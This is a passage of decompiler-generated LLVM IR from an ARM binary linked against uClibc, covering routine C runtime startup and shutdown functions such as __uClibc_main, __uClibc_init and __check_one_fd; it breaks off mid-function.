  %v0_14074 = phi i32 [ %v0_14074.pre, %dec_label_pc_140a4.dec_label_pc_14070_crit_edge ], [ %v0_1406c, %dec_label_pc_14064 ]
  %v0_14070 = load i32, i32* %r7.global-to-local, align 4
  %v1_14070 = add i32 %v0_14070, 132
  %v2_14070 = inttoptr i32 %v1_14070 to i32*
  %v3_14070 = load i32, i32* %v2_14070, align 4
  store i32 %v0_14074, i32* @r2, align 4
  store i32 %v3_14070, i32* %r4.global-to-local, align 4
  %v1_1407c = or i32 %v3_14070, 16
  store i32 %v1_1407c, i32* @r1, align 4
  %v1_1408022 = inttoptr i32 %v0_14074 to i32*
  %v2_1408023 = load i32, i32* %v1_1408022, align 4
  %v3_1408425 = icmp uge i32 %v2_1408023, %v3_14070
  store i1 %v3_1408425, i1* %cpsr_c.global-to-local, align 1
  %v9_1408431 = icmp eq i32 %v2_1408023, %v3_14070
  br i1 %v9_1408431, label %dec_label_pc_1408c, label %dec_label_pc_140a4

dec_label_pc_1408c:                               ; preds = %dec_label_pc_14070, %dec_label_pc_1408c.dec_label_pc_14080_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1409c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1409c, label %dec_label_pc_140a0, label %dec_label_pc_1408c.dec_label_pc_14080_crit_edge

dec_label_pc_1408c.dec_label_pc_14080_crit_edge:  ; preds = %dec_label_pc_1408c
  %v0_14080.pre = load i32, i32* @r2, align 4
  %v1_14084.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14080 = inttoptr i32 %v0_14080.pre to i32*
  %v2_14080 = load i32, i32* %v1_14080, align 4
  %v3_14084 = icmp uge i32 %v2_14080, %v1_14084.pre
  store i1 %v3_14084, i1* %cpsr_c.global-to-local, align 1
  %v9_14084 = icmp eq i32 %v2_14080, %v1_14084.pre
  br i1 %v9_14084, label %dec_label_pc_1408c, label %dec_label_pc_140a4

dec_label_pc_140a0:                               ; preds = %dec_label_pc_1408c
  %v0_140a0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_140a4

dec_label_pc_140a4:                               ; preds = %dec_label_pc_14070, %dec_label_pc_1408c.dec_label_pc_14080_crit_edge, %dec_label_pc_140a0
  %v0_140a4 = phi i32 [ %v0_140a0, %dec_label_pc_140a0 ], [ %v2_1408023, %dec_label_pc_14070 ], [ %v2_14080, %dec_label_pc_1408c.dec_label_pc_14080_crit_edge ]
  %v1_140a4 = phi i32 [ %v0_140a0, %dec_label_pc_140a0 ], [ %v3_14070, %dec_label_pc_14070 ], [ %v1_14084.pre, %dec_label_pc_1408c.dec_label_pc_14080_crit_edge ]
  %v3_140a4 = icmp uge i32 %v0_140a4, %v1_140a4
  store i1 %v3_140a4, i1* %cpsr_c.global-to-local, align 1
  %v9_140a4 = icmp eq i32 %v0_140a4, %v1_140a4
  br i1 %v9_140a4, label %dec_label_pc_140ac, label %dec_label_pc_140a4.dec_label_pc_14070_crit_edge

dec_label_pc_140a4.dec_label_pc_14070_crit_edge:  ; preds = %dec_label_pc_140a4
  %v0_14074.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14070

dec_label_pc_140ac:                               ; preds = %dec_label_pc_140a4
  store i32 116, i32* @r3, align 4
  %v0_140b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_140b4 = add i32 %v0_140b4, 116
  %v3_140b4 = inttoptr i32 %v2_140b4 to i32*
  %v4_140b4 = load i32, i32* %v3_140b4, align 4
  store i32 %v4_140b4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_140b4)
  %v0_140c0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %entry, %bb, %dec_label_pc_14058, %dec_label_pc_140ac
  %v0_140c0 = phi i32 [ %v1_14050, %dec_label_pc_14058 ], [ %v0_140c0.pre, %dec_label_pc_140ac ], [ %v3_14004, %entry ], [ %v1_14050, %bb ]
  %v2_140c4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_140c4, i32* @r4, align 4
  ret i32 %v0_140c0

; uselistorder directives
  uselistorder i32 %v0_140a0, { 1, 0 }
  uselistorder i32 %v1_14084.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14010, { 1, 2, 0 }
  uselistorder i32 %v1_1404c, { 1, 0 }
  uselistorder i32 %v1_14050, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1402c.pre, { 1, 0 }
  uselistorder i32 %v0_1402450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 1, 6, 10, 7, 9, 8, 2, 0 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_140c0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_140a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1408c, { 1, 0 }
  uselistorder label %dec_label_pc_1404c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14034, { 1, 0 }
  uselistorder label %dec_label_pc_1401c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_140e4 = add i32 %tmp, 4
  %v4_140e4 = inttoptr i32 %v3_140e4 to i32*
  store i32 %arg3, i32* %v4_140e4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_140f0 = icmp eq i32 %arg2, 0
  br i1 %v2_140f0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14108 = call i32 @__libc_errno()
  ret i32 %v3_14108

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1413c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14118 = load i32, i32* @r4, align 4
  store i32 %v3_14118, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1413c

dec_label_pc_1413c:                               ; preds = %dec_label_pc_1413c.dec_label_pc_1413c_crit_edge, %dec_label_pc_1413c.lr.ph
  %v1_1413c = phi i32 [ %v1_14148, %dec_label_pc_1413c.dec_label_pc_1413c_crit_edge ], [ 0, %dec_label_pc_1413c.lr.ph ]
  %v0_1413c = phi i32 [ %v0_1413c.pre, %dec_label_pc_1413c.dec_label_pc_1413c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -8), %dec_label_pc_1413c.lr.ph ]
  %v4_1413c = mul i32 %v1_1413c, 4
  %v5_1413c = add i32 %v4_1413c, %v0_1413c
  %v6_1413c = inttoptr i32 %v5_1413c to i32*
  %v7_1413c = load i32, i32* %v6_1413c, align 4
  call void @__pseudo_branch(i32 %v7_1413c)
  %v0_14148 = load i32, i32* %r4.global-to-local, align 4
  %v1_14148 = add i32 %v0_14148, -1
  store i32 %v1_14148, i32* %r4.global-to-local, align 4
  %v2_14148 = icmp eq i32 %v0_14148, 0
  br i1 %v2_14148, label %dec_label_pc_14150, label %dec_label_pc_1413c.dec_label_pc_1413c_crit_edge

dec_label_pc_1413c.dec_label_pc_1413c_crit_edge:  ; preds = %dec_label_pc_1413c
  %v0_1413c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1413c

dec_label_pc_14150:                               ; preds = %dec_label_pc_1413c
  %v0_14154.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14154 = add i32 %v0_14154.pre, 2000
  %v3_14154 = inttoptr i32 %v2_14154 to i32*
  %v4_14154 = load i32, i32* %v3_14154, align 4
  %v2_14158 = icmp eq i32 %v4_14154, 0
  br i1 %v2_14158, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14150
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14150, %bb
  %v2_14160 = xor i1 %v2_14158, true
  call void @__pseudo_cond_branch(i1 %v2_14160, i32 %v4_14154)
  %v0_14168 = load i32, i32* %r5.global-to-local, align 4
  %v2_14168 = add i32 %v0_14168, 2004
  %v3_14168 = inttoptr i32 %v2_14168 to i32*
  %v4_14168 = load i32, i32* %v3_14168, align 4
  %v2_1416c = icmp eq i32 %v4_14168, 0
  br i1 %v2_1416c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14174 = xor i1 %v2_1416c, true
  call void @__pseudo_cond_branch(i1 %v2_14174, i32 %v4_14168)
  %v2_14178 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14178, i32* %r4.global-to-local, align 4
  %v1_1417c = load i32, i32* @r0, align 4
  ret i32 %v1_1417c

; uselistorder directives
  uselistorder i32 %v1_14148, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14194 = load i32, i32* @r4, align 4
  %v6_14194 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_141a8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_141b0 = icmp eq i32 %v2_141a8, -1
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r3, align 4
  br i1 %v3_141b0, label %dec_label_pc_141bc, label %dec_label_pc_141d4

dec_label_pc_141bc:                               ; preds = %entry
  %v0_141c0 = load i32, i32* @r5, align 4
  %v2_141c8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -33916), i32 %v0_141c0)
  %v1_141cc = load i32, i32* @r4, align 4
  %v1_141d0 = icmp ne i32 %v2_141c8, %v1_141cc
  call void @__pseudo_cond_branch(i1 %v1_141d0, i32 ptrtoint (i32* @global_var_12af0.529 to i32))
  br label %dec_label_pc_141d4

dec_label_pc_141d4:                               ; preds = %entry, %dec_label_pc_141bc
  %v1_141dc = phi i32 [ %v2_141a8, %entry ], [ %v2_141c8, %dec_label_pc_141bc ]
  store i32 %v3_14194, i32* @r4, align 4
  store i32 %v6_14194, i32* @r5, align 4
  ret i32 %v1_141dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_141d4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_141e8 = load i32, i32* @r4, align 4
  store i32 %v3_141e8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r4.global-to-local, align 4
  %v4_141f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 148) to i32*), align 4
  %v1_141fc = inttoptr i32 %v4_141f8 to i32*
  %v2_141fc = load i32, i32* %v1_141fc, align 4
  %v2_14200 = icmp eq i32 %v2_141fc, 0
  br i1 %v2_14200, label %dec_label_pc_14208, label %dec_label_pc_1422c

dec_label_pc_14208:                               ; preds = %entry
  store i32 4096, i32* %v1_141fc, align 4
  %v0_14210 = call i32 @__pthread_initialize_minimal()
  %v0_14218 = load i32, i32* %r4.global-to-local, align 4
  %v2_14218 = add i32 %v0_14218, -47876
  %v2_14220 = icmp eq i32 %v2_14218, 0
  br i1 %v2_14220, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14208
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14208, %bb
  %v2_14228 = xor i1 %v2_14220, true
  call void @__pseudo_cond_branch(i1 %v2_14228, i32 %v2_14218)
  %v2_1422c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1422c

dec_label_pc_1422c:                               ; preds = %entry, %bb4
  %v2_1422c = phi i32 [ %v2_1422c.pre, %bb4 ], [ %v3_141e8, %entry ]
  %.0 = phi i32 [ %v0_14210, %bb4 ], [ undef, %entry ]
  store i32 %v2_1422c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_1422c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53848, i32* %r4.global-to-local, align 4
  %v1_1424c = add i32 %tmp, 4
  store i32 %v1_1424c, i32* %ip.global-to-local, align 4
  %v2_14250 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r4.global-to-local, align 4
  %v3_1425c = mul i32 %arg2, 4
  store i32 %v3_1425c, i32* @r7, align 4
  %v4_14264 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 24) to i32*), align 4
  store i32 %v4_14264, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_1426c = add i32 %v1_1424c, %v3_1425c
  store i32 %v2_1426c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %stack_var_-416, align 4
  %v4_14274 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 56) to i32*), align 4
  store i32 %v4_14274, i32* %r4.global-to-local, align 4
  %v3_14278 = icmp uge i32 %v2_1426c, %v2_14250
  store i1 %v3_14278, i1* %cpsr_c.global-to-local, align 1
  %v9_14278 = icmp eq i32 %v2_1426c, %v2_14250
  store i1 %v9_14278, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14280 = inttoptr i32 %v4_14274 to i32*
  store i32 %v2_1426c, i32* %v2_14280, align 4
  br i1 %v9_14278, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14288 = load i32, i32* %r2.global-to-local, align 4
  %v1_14288 = load i32, i32* %r1.global-to-local, align 4
  %v2_14288 = inttoptr i32 %v1_14288 to i32*
  store i32 %v0_14288, i32* %v2_14288, align 4
  %v2_1428c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1428c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2004, i32* %r2.global-to-local, align 4
  %v0_14298 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14298, i32* @r6, align 4
  br i1 %v9_14278, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_142a053 = add i32 %v2_1428c, 2004
  %v4_142a054 = inttoptr i32 %v3_142a053 to i32*
  store i32 %arg6, i32* %v4_142a054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_1429c = load i32, i32* %ip.global-to-local, align 4
  %v2_1429c = load i32, i32* @r7, align 4
  %v3_1429c = add i32 %v2_1429c, %v1_1429c
  store i32 %v3_1429c, i32* %r3.global-to-local, align 4
  %v3_142a050 = add i32 %v2_1428c, 2004
  %v4_142a051 = inttoptr i32 %v3_142a050 to i32*
  store i32 %arg6, i32* %v4_142a051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_142ac = load i32, i32* %r3.global-to-local, align 4
  %v2_142ac = load i32, i32* %r4.global-to-local, align 4
  %v3_142ac = inttoptr i32 %v2_142ac to i32*
  store i32 %v1_142ac, i32* %v3_142ac, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_142b0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_142b0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_142b8 = bitcast i32* %stack_var_-120 to i8*
  %v4_142b8 = call i32 @__GI_memset(i8* %v3_142b8, i32 0, i32 120)
  store i32 %v4_142b8, i32* %r0.global-to-local, align 4
  %v0_142bc = load i32, i32* %r4.global-to-local, align 4
  %v1_142bc = inttoptr i32 %v0_142bc to i32*
  %v2_142bc = load i32, i32* %v1_142bc, align 4
  br label %dec_label_pc_142c8

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142c8, %bb77
  %storemerge = phi i32 [ %v2_142bc, %bb77 ], [ %v1_142d4, %dec_label_pc_142c8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_142c8 = inttoptr i32 %storemerge to i32*
  %v2_142c8 = load i32, i32* %v1_142c8, align 4
  store i32 %v2_142c8, i32* %r3.global-to-local, align 4
  %v2_142cc = icmp eq i32 %v2_142c8, 0
  %v1_142d4 = add i32 %storemerge, 4
  br i1 %v2_142cc, label %dec_label_pc_142d4, label %dec_label_pc_142c8

dec_label_pc_142d4:                               ; preds = %dec_label_pc_142c8
  store i32 %v1_142d4, i32* @r4, align 4
  store i32 %v2_142b0, i32* @r5, align 4
  %v1_142f830 = inttoptr i32 %v1_142d4 to i32*
  %v2_142f831 = load i32, i32* %v1_142f830, align 4
  store i32 %v2_142f831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_142fc33 = icmp eq i32 %v2_142f831, 0
  store i1 %v2_142fc33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142fc33, label %dec_label_pc_14304, label %dec_label_pc_142e0

dec_label_pc_142e0:                               ; preds = %dec_label_pc_142d4, %dec_label_pc_142f8
  %v4_142e8 = phi i32 [ %v1_142f4, %dec_label_pc_142f8 ], [ %v1_142d4, %dec_label_pc_142d4 ]
  %v5_142e4 = phi i32 [ %v2_142f8, %dec_label_pc_142f8 ], [ %v2_142f831, %dec_label_pc_142d4 ]
  %v2_142e0 = icmp ugt i32 %v5_142e4, 13
  store i1 %v2_142e0, i1* %cpsr_c.global-to-local, align 1
  %v7_142e0 = icmp eq i32 %v5_142e4, 14
  store i1 %v7_142e0, i1* %cpsr_z.global-to-local, align 1
  %v2_142e4 = xor i1 %v2_142e0, true
  %v3_142e4 = or i1 %v7_142e0, %v2_142e4
  br i1 %v3_142e4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_142e0
  %v4_142e4 = load i32, i32* @r5, align 4
  %v6_142e4 = and i32 %v5_142e4, 536870912
  %v7_142e4 = icmp ne i32 %v6_142e4, 0
  store i1 %v7_142e4, i1* %cpsr_c.global-to-local, align 1
  %v8_142e4 = mul i32 %v5_142e4, 8
  %v9_142e4 = add i32 %v4_142e4, %v8_142e4
  store i32 %v9_142e4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_142e0, %bb78
  %v1_142f0 = phi i1 [ %v2_142e0, %dec_label_pc_142e0 ], [ %v7_142e4, %bb78 ]
  %v2_142e8 = xor i1 %v1_142f0, true
  %v3_142e8 = or i1 %v7_142e0, %v2_142e8
  br i1 %v3_142e8, label %bb80, label %dec_label_pc_142f8

bb80:                                             ; preds = %bb79
  store i32 %v4_142e8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_142f8

dec_label_pc_142f8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_142e8, i32 ptrtoint (i32* @global_var_10fa0.538 to i32))
  %v0_142f4 = load i32, i32* @r4, align 4
  %v1_142f4 = add i32 %v0_142f4, 8
  store i32 %v1_142f4, i32* @r4, align 4
  %v1_142f8 = inttoptr i32 %v1_142f4 to i32*
  %v2_142f8 = load i32, i32* %v1_142f8, align 4
  store i32 %v2_142f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_142fc = icmp eq i32 %v2_142f8, 0
  store i1 %v2_142fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142fc, label %dec_label_pc_14304, label %dec_label_pc_142e0

dec_label_pc_14304:                               ; preds = %dec_label_pc_142f8, %dec_label_pc_142d4
  store i32 %v2_142b0, i32* %r0.global-to-local, align 4
  %v1_14308 = call i32 @_dl_aux_init(i32 %v2_142b0)
  store i32 %v1_14308, i32* %r0.global-to-local, align 4
  %v1_1430c = call i32 @__GI___uClibc_init(i32 %v1_14308)
  store i32 %v1_1430c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_14314 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14314, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1431c = add i32 %v2_14314, 148
  %v3_1431c = inttoptr i32 %v2_1431c to i32*
  %v4_1431c = load i32, i32* %v3_1431c, align 4
  store i32 %v4_1431c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14324 = icmp eq i32 %tmp66, 0
  store i1 %v2_14324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14324, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_14304
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_14304, %bb81
  %v0_14330 = phi i32 [ %tmp66, %dec_label_pc_14304 ], [ 4096, %bb81 ]
  %v3_1432c = icmp eq i32 %tmp65, -1
  store i1 %v3_1432c, i1* %cpsr_c.global-to-local, align 1
  %v8_1432c = icmp eq i32 %tmp65, -1
  store i1 %v8_1432c, i1* %cpsr_z.global-to-local, align 1
  %v2_14330 = inttoptr i32 %v4_1431c to i32*
  store i32 %v0_14330, i32* %v2_14330, align 4
  br i1 %v3_1432c, label %dec_label_pc_14338, label %dec_label_pc_14360

dec_label_pc_14338:                               ; preds = %bb82
  %v0_14338 = call i32 @getuid()
  store i32 %v0_14338, i32* @r0, align 4
  store i32 %v0_14338, i32* %r4.global-to-local, align 4
  %v0_14340 = call i32 @geteuid()
  store i32 %v0_14340, i32* @r0, align 4
  %v3_14344 = icmp uge i32 %v0_14338, %v0_14340
  store i1 %v3_14344, i1* %cpsr_c.global-to-local, align 1
  %v9_14344 = icmp eq i32 %v0_14338, %v0_14340
  store i1 %v9_14344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14344, label %dec_label_pc_1434c, label %dec_label_pc_14388

dec_label_pc_1434c:                               ; preds = %dec_label_pc_14338
  %v1_1434c = call i32 @getgid(i32 %v0_14340)
  store i32 %v1_1434c, i32* @r0, align 4
  store i32 %v1_1434c, i32* %r4.global-to-local, align 4
  %v0_14354 = call i32 @getegid()
  store i32 %v0_14354, i32* %r0.global-to-local, align 4
  %v3_14358 = icmp uge i32 %v1_1434c, %v0_14354
  store i1 %v3_14358, i1* %cpsr_c.global-to-local, align 1
  %v9_14358 = icmp eq i32 %v1_1434c, %v0_14354
  store i1 %v9_14358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14358, label %dec_label_pc_14360, label %dec_label_pc_14388

dec_label_pc_14360:                               ; preds = %dec_label_pc_1434c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1432c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1432c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1432c, label %dec_label_pc_143b0, label %dec_label_pc_1436c

dec_label_pc_1436c:                               ; preds = %dec_label_pc_14360
  store i32 %tmp64, i32* @r3, align 4
  %v3_14370 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_14370, i1* %cpsr_c.global-to-local, align 1
  %v9_14370 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_14370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14370, label %dec_label_pc_14378, label %dec_label_pc_14388

dec_label_pc_14378:                               ; preds = %dec_label_pc_1436c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_14380 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_14380, i1* %cpsr_c.global-to-local, align 1
  %v9_14380 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_14380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14380, label %dec_label_pc_143b0, label %dec_label_pc_14388

dec_label_pc_14388:                               ; preds = %dec_label_pc_1436c, %dec_label_pc_1434c, %dec_label_pc_14338, %dec_label_pc_14378
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_14394 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1439c = load i32, i32* @r4, align 4
  store i32 %v0_1439c, i32* %r1.global-to-local, align 4
  %v2_143a0 = call i32 @__check_one_fd(i32 1, i32 %v0_1439c)
  %v0_143a4 = load i32, i32* @r4, align 4
  store i32 %v0_143a4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_143ac = call i32 @__check_one_fd(i32 2, i32 %v0_143a4)
  store i32 %v2_143ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_143b0

dec_label_pc_143b0:                               ; preds = %dec_label_pc_14378, %dec_label_pc_14360, %dec_label_pc_14388
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v2_143b8 = load i32, i32* %arg3, align 4
  store i32 %v2_143b8, i32* %r2.global-to-local, align 4
  %v2_143bc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_143bc, i32* %r1.global-to-local, align 4
  %v3_143c0 = add i32 %v2_143bc, 256
  %v4_143c0 = inttoptr i32 %v3_143c0 to i32*
  store i32 %v2_143b8, i32* %v4_143c0, align 4
  %v0_143c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_143c4 = inttoptr i32 %v0_143c4 to i32*
  %v2_143c4 = load i32, i32* %v1_143c4, align 4
  store i32 %v2_143c4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143c8 = icmp eq i32 %v2_143c4, 0
  store i1 %v2_143c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143c8, label %bb84, label %dec_label_pc_143d0

dec_label_pc_143d0:                               ; preds = %dec_label_pc_143b0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_143d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_143d4 = add i32 %v0_143d4, 164
  %v3_143d4 = inttoptr i32 %v2_143d4 to i32*
  %v4_143d4 = load i32, i32* %v3_143d4, align 4
  store i32 %v4_143d4, i32* %r3.global-to-local, align 4
  %v2_143d8 = inttoptr i32 %v4_143d4 to i32*
  store i32 %v2_143c4, i32* %v2_143d8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_143e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_143e0 = inttoptr i32 %v0_143e0 to i32*
  %v2_143e0 = load i32, i32* %v1_143e0, align 4
  store i32 %v2_143e0, i32* %r0.global-to-local, align 4
  %v4_143e4 = call i32 @__GI_strrchr(i32 %v2_143e0, i32 47, i32 %v2_143b8, i32 %v4_143d4)
  store i32 %v4_143e4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_143ec = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_143ec, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143f0 = icmp eq i32 %v4_143e4, 0
  store i1 %v2_143f0, i1* %cpsr_z.global-to-local, align 1
